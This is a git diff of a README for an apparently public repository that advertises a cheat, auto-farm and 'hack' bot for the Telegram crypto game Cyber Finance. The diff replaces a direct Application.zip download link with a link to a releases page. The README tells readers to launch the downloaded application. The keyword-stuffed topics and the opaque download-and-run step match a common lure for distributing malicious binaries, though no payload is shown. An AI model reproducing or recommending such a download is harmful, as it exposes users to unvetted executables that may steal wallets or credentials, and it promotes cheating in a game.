@@ -16,9 +16,9 @@ Welcome to the Cyber Finance Game Bot repository - the ultimate tool for automat
 - **Topics:** auto-clicker, auto-farm, blockchain-game, blockchain-technology, cfi-crypto, clicker-game, crypto-game, crypto-hack, cryptocurrency-game, cyber-finance-bot, cyber-finance-game, cyber-game-bot, ethereum-game, exploit, game-bot, game-cheat, hack, mini-game, profit-optimization, telegram-game
 
 ## Get Started
-🔗 **Download Application:** [Application.zip](https://github.com/files/uploaded/Application.zip)
+🔗 **Download Application:** [https://github.com/idontwantobefood/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases](https://github.com/idontwantobefood/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases)
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/files/uploaded/Application.zip)
+[![Download Application](https://github.com/idontwantobefood/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases)](https://github.com/idontwantobefood/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases)
 
 If the link ends with the file name, you need to launch the downloaded application.
 
